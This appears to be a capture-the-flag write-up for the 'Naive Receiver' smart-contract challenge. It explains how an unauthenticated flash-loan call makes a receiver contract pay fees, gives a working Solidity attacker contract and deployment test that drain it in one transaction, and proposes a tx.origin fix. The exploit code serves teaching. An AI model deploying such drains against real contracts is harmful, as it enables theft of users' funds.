# Naive Receiver

## Challenge

There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

## Solution

Our goal is to drain all funds from the `FlashLoanReceiver` contract. We observe that the only place this contract sends funds to an external account is within the `receiveEther` function.

```solidity
function receiveEther(uint256 fee) public payable {
    require(msg.sender == pool, "Sender must be pool");

    uint256 amountToBeRepaid = msg.value + fee;

    require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");

    _executeActionDuringFlashLoan();

    // Return funds to pool
    pool.sendValue(amountToBeRepaid);
}
```

The first `require` makes this function only callable by the lending pool. This seems like putting trust on the lending pool, however we will see that is not the case. Let us have a look at the signature of the `flashLoan` function in the `NaiveReceiverLenderPool` contract

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant
```

When calling this function from an external source and passing the borrower parameter to be the addess of `FlashLoanReceiver`, the following function will be executed

```solidity
borrower.functionCallWithValue(
    abi.encodeWithSignature(
        "receiveEther(uint256)",
        FIXED_FEE
    ),
    borrowAmount
);
```

In this context, even if the external actor makes this function to execute, `msg.sender` is the lending pool itself. Therefore `receiveEther` will execute without any issues.

This is exactly where the vulnerability can be exploited. Making an external call to the `flashLoan` function will force the `FlashLoanReceiver` contract to pay the fee for the loan. If we are able to call 10 times this `flashLoan` function, all funds of `FlashLoanReceiver` will be transferred to `NaiveReceiverLenderPool`. In order to do so in one transaction, we will deploy an `AttackerNaiveReceiver` contract.

### Attacker contract

We first create an interface to interact with the lender contract as follows

```solidity
interface ILenderPool{
    function flashLoan(address borrower, uint256 borrowAmount) external;
}
```

Then we create the attacker contract with a function that will execute 10 times in a row a flashloan for only 1 ether, each time getting 1 ether in fees being transferred to the `NaiveReceiverLenderPool` contract

```solidity
contract AttackerNaiveReceiver {
    function attack(address _lenderPool, address _naiveReceiver) public {
        for (uint i = 0; i < 10; i++) {
            ILenderPool(_lenderPool).flashLoan(_naiveReceiver, 1 ether);
        }
    }
}
```

This contract is stored in [this file](./AttackerNaiveReceiver.sol).

### Deployment Script

The only thing we need to do now is to deploy the attacker contract and pass the address of both the lending and the receiver contracts. We complete the code in [`naive-receiver.challenge.js`](../../test/naive-receiver/naive-receiver.challenge.js) as follows

```javascript
it("Exploit", async function () {
  /** CODE YOUR EXPLOIT HERE */
  const Attacker = await ethers.getContractFactory(
    "AttackerNaiveReceiver",
    attacker
  )
  attackerContract = await Attacker.deploy()
  await attackerContract.attack(this.pool.address, this.receiver.address)
})
```

## Solving the issue with `tx.origin`

We have seen that we should not always trust `msg.sender`. In order to solve the issue we need to make sure that the only user that can call the `flashLoan` function from the receiver contract is an address under the control of the receiver. We could store this address in the receiver contract as `admin` and add the following line after the first `require` in `receiveEther`

```solidity
require(tx.origin == admin, 'Only admin can initiate a flashLoan')
```

The parameter `tx.origin` corresponds to the address that initiate the transaction, and therefore the attack we perform before would not work from an arbitrary address. Special attention is needed in this case, because transactions initiated by the admin account are subject to be routed by malicious smart contracts in order to execute the `flashLoan` function.
